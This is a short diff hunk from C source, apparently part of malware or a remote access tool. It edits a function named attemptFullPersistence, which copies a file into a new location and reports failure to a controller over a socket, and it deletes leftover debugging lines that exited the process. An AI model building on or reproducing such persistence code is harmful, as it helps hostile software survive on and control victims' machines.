@@ -426,12 +426,6 @@ void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {
 	wcscat(wszPath, name);
 
 	if (pMoveFileExW(dirName, wszPath, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING) == 0) {
-		DWORD err;
-
-		err = GetLastError();
-
-		ExitProcess(err);
-
 		pSend(*pSockfd, failed, sizeof failed, 0);
 		return;
 	}
